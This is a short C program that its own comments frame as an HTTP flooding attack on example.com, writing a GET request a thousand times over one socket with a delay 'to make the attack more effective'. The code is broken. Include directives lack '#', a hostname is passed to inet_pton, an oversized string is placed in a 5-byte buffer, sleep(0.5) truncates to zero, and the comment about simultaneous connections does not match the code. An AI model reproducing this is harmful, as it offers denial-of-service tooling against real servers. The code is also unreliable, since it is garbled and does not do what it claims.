
#include <stdio.h>
include <string.h>
include <unistd.h>
include <sys/socket.h>
include <arpa/inet.h>

int main(void) {
    // Set target URL
    char *url = "http://example.com";
    
    // Initialize socket and connect to the server
    int sockfd;
    struct sockaddr_in serv_addr;
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("Error in creating socket\n");
        return 1;
    }
    
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80); // HTTP port number
    inet_pton(AF_INET, "example.com", &serv_addr.sin_addr.s_addr);
    
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
        printf("Error in connecting\n");
        return 2;
    }
    
    // Loop through 1000 simultaneous connections
    for (int i = 1; i <= 1000; i++) {
        char request[5] = "GET / HTTP/1.1\r\n";
        
        write(sockfd, request, strlen(request));
        sleep(0.5); // Add a delay to make the attack more effective
    }
    
    return 0;
}
